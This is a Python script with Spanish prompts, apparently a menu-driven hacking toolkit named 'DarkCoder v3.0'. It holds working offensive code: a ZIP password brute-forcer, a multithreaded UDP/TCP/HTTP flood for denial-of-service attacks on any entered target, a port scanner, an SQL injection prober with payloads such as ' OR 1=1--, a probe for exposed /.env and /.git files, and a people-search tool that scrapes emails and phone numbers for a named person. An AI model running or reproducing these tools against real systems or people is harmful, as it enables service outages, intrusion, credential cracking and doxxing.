#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import zipfile
import threading
import itertools
import requests
import re
import dns.resolver
import whois
from bs4 import BeautifulSoup
from datetime import datetime

# ===== [ CONFIGURACIÓN INICIAL ] =====
os.system("clear || cls")

# ===== [ COLORES ] =====
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

# ===== [ ASCII ART ] =====
BANNER = f"""
{RED}▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀ ██▓ ███▄    █ 
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▓██▒ ██ ▀█   █ 
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒██▒▓██  ▀█ ██▒
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ░██░▓██▒  ▐▌██▒
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄░██░▒██░   ▓██░
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒ 
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░  ▒ ░   ░   ░ ░ 
   ░          ░  ░   ░     ░  ░    ░           ░ 
 ░                                               
{BLUE}          [ DarkCoder v3.0 - OSINT Pro ]          
"""

MENU = f"""
{GREEN}[1]{RESET} Fuerza Bruta ZIP/RAR/7Z
{GREEN}[2]{RESET} Ataque DDoS (UDP/TCP/HTTP Flood)
{GREEN}[3]{RESET} Escáner de Puertos + Exploit Finder
{GREEN}[4]{RESET} SQL Injection Scanner (POST/GET)
{GREEN}[5]{RESET} OSINT de Páginas Web (Info Masiva)
{GREEN}[6]{RESET} OSINT de Redes (Búsqueda Profunda)
{GREEN}[7]{RESET} Salir
"""

# ===== [ FUNCIONES PRINCIPALES ] =====

def crack_zip():
    print(r"""
   ▄████▄   ██▀███   ▄▄▄      ██▓███  ██▓ ██▓    
  ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄   ▓██░  ██▒▓██▒▓██▒    
  ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄ ▓██░ ██▓▒▒██▒▒██░    
  ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██▒██▄█▓▒ ▒░██░▒██░    
  ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒██▒ ░  ░░██░░██████▒
  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█▒▓▒░ ░  ░░▓  ░ ▒░▓  ░
    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░▒ ░      ▒ ░░ ░ ▒  ░
  ░          ░░   ░   ░   ▒   ░░        ▒ ░  ░ ░   
  ░ ░         ░           ░  ░          ░      ░  ░
  ░                                                 
    """)
    
    archivo = input("[+] Archivo ZIP/RAR/7Z: ")
    if not os.path.exists(archivo):
        print("[-] ¡Archivo no encontrado!")
        return
    
    print("\n[+] Selecciona el tipo de ataque:")
    print("[1] Diccionario (rockyou.txt)")
    print("[2] Fuerza Bruta Personalizada")
    print("[3] Ataque Híbrido (Diccionario + Fuerza Bruta)")
    
    opcion = input("[+] Opción: ")
    
    if opcion == "1":
        diccionario = input("[+] Ruta del diccionario (ej: rockyou.txt): ")
        if not os.path.exists(diccionario):
            print("[-] ¡Diccionario no encontrado!")
            return
        
        print("\n[+] Iniciando ataque por diccionario...")
        with open(diccionario, "r", errors="ignore") as f:
            palabras = f.read().splitlines()
        
    elif opcion == "2":
        caracteres = input("[+] Caracteres a usar (ej: abc123!@#): ")
        min_len = int(input("[+] Longitud mínima: "))
        max_len = int(input("[+] Longitud máxima: "))
        palabras = []
        
        for length in range(min_len, max_len + 1):
            for combo in itertools.product(caracteres, repeat=length):
                palabras.append("".join(combo))
    
    elif opcion == "3":
        diccionario = input("[+] Ruta del diccionario: ")
        if not os.path.exists(diccionario):
            print("[-] ¡Diccionario no encontrado!")
            return
        
        with open(diccionario, "r", errors="ignore") as f:
            palabras = f.read().splitlines()
        
        caracteres_extra = input("[+] Caracteres adicionales para variaciones: ")
        palabras.extend(["".join(p + c) for p in palabras for c in caracteres_extra])
    
    else:
        print("[-] Opción inválida")
        return
    
    encontrada = False
    start_time = time.time()
    
    with zipfile.ZipFile(archivo) as zf:
        for password in palabras:
            try:
                zf.extractall(pwd=password.encode())
                encontrada = True
                print(f"\n[+] ¡Contraseña encontrada!: {password}")
                break
            except:
                print(f"[*] Probando: {password}", end="\r")
    
    if not encontrada:
        print("\n[-] Contraseña no encontrada")
    
    print(f"[+] Tiempo transcurrido: {time.time() - start_time:.2f} segundos")

def ddos_attack():
    print(r"""
  ▓█████▄  ▓█████▄  ▓█████▄   ██████ ▓█████ 
  ▒██▀ ██▌ ▒██▀ ██▌ ▒██▀ ██▌▒██    ▒ ▓█   ▀ 
  ░██   █▌ ░██   █▌ ░██   █▌░ ▓██▄   ▒███   
  ░▓█▄   ▌ ░▓█▄   ▌ ░▓█▄   ▌  ▒   ██▒▒▓█  ▄ 
  ░▒████▓  ░▒████▓  ░▒████▓ ▒██████▒▒░▒████▒
   ▒▒▓  ▒   ▒▒▓  ▒   ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░
   ░ ▒  ▒   ░ ▒  ▒   ░ ▒  ▒ ░ ░▒  ░ ░ ░ ░  ░
   ░ ░  ░   ░ ░  ░   ░ ░  ░ ░  ░  ░     ░   
     ░        ░        ░          ░     ░  ░
   ░        ░        ░                      
    """)
    
    objetivo = input("[+] IP o URL del objetivo: ")
    puerto = int(input("[+] Puerto: "))
    duracion = int(input("[+] Duración (segundos): "))
    hilos = int(input("[+] Número de hilos: "))
    metodo = input("[+] Método (UDP/TCP/HTTP): ").upper()
    
    print("\n[+] Configurando ataque...")
    time.sleep(1)
    
    if metodo == "UDP":
        paquete = random._urandom(1490)
    elif metodo == "TCP":
        paquete = ("GET / HTTP/1.1\r\nHost: " + objetivo + "\r\n\r\n").encode()
    elif metodo == "HTTP":
        paquete = ("POST / HTTP/1.1\r\nHost: " + objetivo + "\r\nContent-Length: 10000\r\n\r\n" + "A"*10000).encode()
    else:
        print("[-] Método no válido")
        return
    
    timeout = time.time() + duracion
    paquetes_enviados = 0
    
    def ataque():
        nonlocal paquetes_enviados
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if metodo == "UDP" else socket.SOCK_STREAM)
        while time.time() < timeout:
            try:
                if metodo == "UDP":
                    s.sendto(paquete, (objetivo, puerto))
                else:
                    s.connect((objetivo, puerto))
                    s.send(paquete)
                paquetes_enviados += 1
                print(f"[+] Paquetes enviados: {paquetes_enviados}", end="\r")
            except:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if metodo == "UDP" else socket.SOCK_STREAM)
    
    print(f"\n[+] Iniciando ataque {metodo} a {objetivo}:{puerto}...")
    for _ in range(hilos):
        threading.Thread(target=ataque).start()
    
    time.sleep(duracion)
    print(f"\n[+] Ataque finalizado. Total de paquetes: {paquetes_enviados}")

def port_scanner():
    print(r"""
  ▓█████▄  ▒█████   ███▄    █  ██▓ ███▄    █ ▓█████▄ 
  ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▓██▒ ██ ▀█   █ ▒██▀ ██▌
  ░██   █▌▒██░  ██▒▓██  ▀█ ██▒▒██▒▓██  ▀█ ██▒░██   █▌
  ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒░██░▓██▒  ▐▌██▒░▓█▄   ▌
  ░▒████▓ ░ ████▓▒░▒██░   ▓██░░██░▒██░   ▓██░░▒████▓ 
   ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ 
   ░ ▒  ▒   ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒ 
   ░ ░  ░ ░ ░ ░ ▒     ░   ░ ░  ▒ ░   ░   ░ ░  ░ ░  ░ 
     ░        ░ ░           ░  ░           ░    ░    
   ░                                              ░  
    """)
    
    objetivo = input("[+] IP o dominio a escanear: ")
    inicio = int(input("[+] Puerto inicial: "))
    fin = int(input("[+] Puerto final: "))
    hilos = int(input("[+] Hilos (recomendado: 50-200): "))
    
    print("\n[+] Escaneando puertos...")
    puertos_abiertos = []
    
    def escanear(puerto):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            if s.connect_ex((objetivo, puerto)) == 0:
                puertos_abiertos.append(puerto)
                servicio = socket.getservbyport(puerto, 'tcp') if puerto <= 1024 else "?"
                print(f"[+] Puerto {puerto} ({servicio}) - ABIERTO")
                
                # Detección de posibles vulnerabilidades
                if puerto == 22:
                    print("   [!] Posible SSH vulnerable a brute-force")
                elif puerto == 80 or puerto == 443:
                    print("   [!] Servidor web - Verificar SQLi/XSS")
                elif puerto == 3389:
                    print("   [!] RDP - Posible ataque de fuerza bruta")
        except:
            pass
        s.close()
    
    for puerto in range(inicio, fin + 1):
        threading.Thread(target=escanear, args=(puerto,)).start()
        while threading.active_count() > hilos:
            time.sleep(0.1)
    
    while threading.active_count() > 1:
        time.sleep(1)
    
    print("\n[+] Escaneo completado!")
    print(f"[+] Puertos abiertos: {sorted(puertos_abiertos)}")

def sql_injection():
    print(r"""
   ███████ ██   ██  ██      ██ ██████  ███████ ████████ ██  ██████ ██████  
   ██       ██ ██   ██      ██ ██   ██ ██         ██    ██ ██      ██   ██ 
   █████     ███    ██      ██ ██████  █████      ██    ██ ██      ██████  
   ██       ██ ██   ██      ██ ██   ██ ██         ██    ██ ██      ██   ██ 
   ███████ ██   ██  ███████ ██ ██   ██ ███████    ██    ██  ██████ ██   ██ 
    """)
    
    url = input("[+] URL objetivo (ej: http://example.com/login.php): ")
    parametros = input("[+] Parámetros a probar (ej: id,user,search): ").split(",")
    
    print("\n[+] Probando inyecciones SQL...")
    
    payloads = [
        "'", "\"", "' OR '1'='1", "' OR 1=1--", 
        "' UNION SELECT null--", "admin'--", 
        "1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
    ]
    
    vulnerables = []
    
    for param in parametros:
        for payload in payloads:
            try:
                if "=" in url:
                    url_mod = url.replace(f"{param}=", f"{param}={payload}")
                else:
                    url_mod = f"{url}?{param}={payload}"
                
                respuesta = requests.get(url_mod, timeout=5)
                
                if "error" in respuesta.text.lower() or "syntax" in respuesta.text.lower():
                    print(f"[!] Posible SQLi en parámetro: {param}")
                    print(f"    Payload: {payload}")
                    vulnerables.append(param)
                    break
            except:
                pass
    
    if not vulnerables:
        print("\n[-] No se encontraron vulnerabilidades SQLi evidentes")
    else:
        print("\n[+] Vulnerabilidades encontradas en:")
        for vuln in vulnerables:
            print(f"    - {vuln}")

def osint_web():
    print(f"""
{RED}
   ▒█████   ███████ ██ ███    ██ ████████ 
  ██▒  ██▒ ██      ██ ████   ██    ██    
 ██▒ ▒ ██░ █████   ██ ██ ██  ██    ██    
 ██░ ░ ██░ ██      ██ ██  ██ ██    ██    
 ▒█   ██▒ ███████ ██ ██   ████    ██    
{RESET}""")

    dominio = input(f"{CYAN}[+] Dominio o URL a investigar: {RESET}").strip()
    print(f"\n{YELLOW}[+] Analizando {dominio}...{RESET}\n")

    # WHOIS Information
    try:
        print(f"{GREEN}[+] WHOIS Information:{RESET}")
        w = whois.whois(dominio)
        for key, value in w.items():
            print(f"{BLUE}   {key}:{RESET} {value}")
    except Exception as e:
        print(f"{RED}[-] Error en WHOIS: {e}{RESET}")

    # DNS Records
    try:
        print(f"\n{GREEN}[+] DNS Records:{RESET}")
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        for record in record_types:
            try:
                answers = dns.resolver.resolve(dominio, record)
                print(f"{BLUE}   {record}:{RESET}")
                for rdata in answers:
                    print(f"      {rdata}")
            except:
                pass
    except Exception as e:
        print(f"{RED}[-] Error en DNS: {e}{RESET}")

    # Extracción de Emails
    try:
        print(f"\n{GREEN}[+] Buscando Emails:{RESET}")
        response = requests.get(f"http://{dominio}", timeout=10)
        emails = re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I)
        if emails:
            for email in set(emails):
                print(f"   {BLUE}Email encontrado:{RESET} {email}")
        else:
            print(f"{YELLOW}   No se encontraron emails.{RESET}")
    except:
        pass

    # Subdominios Comunes
    print(f"\n{GREEN}[+] Buscando Subdominios:{RESET}")
    subdomains = ["www", "mail", "ftp", "admin", "blog", "webmail", "cpanel", "dev"]
    for sub in subdomains:
        try:
            ip = socket.gethostbyname(f"{sub}.{dominio}")
            print(f"   {BLUE}Subdominio activo:{RESET} {sub}.{dominio} → {ip}")
        except:
            pass

    # Detección de Tecnologías
    try:
        print(f"\n{GREEN}[+] Tecnologías detectadas:{RESET}")
        headers = requests.get(f"http://{dominio}", timeout=10).headers
        if 'server' in headers:
            print(f"   {BLUE}Servidor:{RESET} {headers['server']}")
        if 'x-powered-by' in headers:
            print(f"   {BLUE}Powered By:{RESET} {headers['x-powered-by']}")
    except:
        pass

    # Posibles Vulnerabilidades
    print(f"\n{GREEN}[+] Posibles Vulnerabilidades:{RESET}")
    vulns = {
        "CMS": ["wordpress", "joomla", "drupal"],
        "Admin Panels": ["/admin", "/wp-admin", "/administrator"],
        "Sensitive Files": ["/robots.txt", "/.git", "/.env"]
    }
    for vuln_type, paths in vulns.items():
        for path in paths:
            try:
                url = f"http://{dominio}/{path}"
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"   {RED}¡Posible {vuln_type} expuesto!{RESET} {url}")
            except:
                pass

def osint_redes():
    print(f"""
{RED}
   ▒█████   ███████ ██ ███    ██ ████████ ██████   ██████  ███████ ███████ 
  ██▒  ██▒ ██      ██ ████   ██    ██    ██   ██ ██    ██ ██      ██      
 ██▒ ▒ ██░ █████   ██ ██ ██  ██    ██    ██████  ██    ██ █████   ███████ 
 ██░ ░ ██░ ██      ██ ██  ██ ██    ██    ██   ██ ██    ██ ██           ██ 
 ▒█   ██▒ ███████ ██ ██   ████    ██    ██   ██  ██████  ███████ ███████ 
{RESET}""")

    nombre = input(f"{CYAN}[+] Nombre a investigar (ej: 'Juan Perez'): {RESET}").strip()
    print(f"\n{YELLOW}[+] Buscando información en redes...{RESET}\n")

    # Lista de sitios para buscar
    sitios = [
        f"https://www.google.com/search?q={nombre}",
        f"https://www.linkedin.com/search/results/people/?keywords={nombre}",
        f"https://www.facebook.com/search/people/?q={nombre}",
        f"https://twitter.com/search?q={nombre}",
        f"https://www.instagram.com/{nombre.replace(' ', '')}",
        f"https://github.com/{nombre.replace(' ', '')}",
        "https://haveibeenpwned.com/",
        "https://www.spokeo.com/",
        "https://www.peekyou.com/",
        "https://pipl.com/",
        "https://www.truepeoplesearch.com/",
        "https://thatsthem.com/"
    ]

    # Headers para evitar bloqueos
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Búsqueda en cada sitio
    for sitio in sitios:
        try:
            print(f"{BLUE}[*] Buscando en: {sitio}{RESET}")
            response = requests.get(sitio, headers=headers, timeout=10)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extracción de posibles datos
                emails = re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I)
                phones = re.findall(r"\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}", response.text)
                
                if emails:
                    print(f"{GREEN}   Emails encontrados:{RESET}")
                    for email in set(emails):
                        print(f"      {email}")
                
                if phones:
                    print(f"{GREEN}   Teléfonos encontrados:{RESET}")
                    for phone in set(phones):
                        print(f"      {phone}")
                
                # Extracción de enlaces relacionados
                links = soup.find_all('a', href=True)
                relevant_links = [link['href'] for link in links if nombre.lower() in link['href'].lower()]
                
                if relevant_links:
                    print(f"{GREEN}   Enlaces relevantes:{RESET}")
                    for link in set(relevant_links[:5]):
                        print(f"      {link}")
            
            time.sleep(random.uniform(1, 3))  # Evitar bloqueos
            
        except Exception as e:
            print(f"{RED}   Error en {sitio}: {e}{RESET}")

def main():
    os.system("clear || cls")
    for char in BANNER:
        print(char, end="", flush=True)
        time.sleep(0.001)
    print()
    
    while True:
        print(MENU)
        opcion = input(f"{CYAN}[DarkCoder]# {RESET}").strip()
        
        if opcion == "1":
            crack_zip()
        elif opcion == "2":
            ddos_attack()
        elif opcion == "3":
            port_scanner()
        elif opcion == "4":
            sql_injection()
        elif opcion == "5":
            osint_web()
        elif opcion == "6":
            osint_redes()
        elif opcion == "7":
            print(f"\n{GREEN}[+] Saliendo... ¡Recuerda usar tus poderes para el bien!{RESET}\n")
            break
        else:
            print(f"{RED}[-] Opción no válida{RESET}")
        
        input(f"\n{YELLOW}[+] Presiona Enter para continuar...{RESET}")
        os.system("clear || cls")
        print(BANNER)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[-] Operación cancelada por el usuario{RESET}")
        sys.exit(0)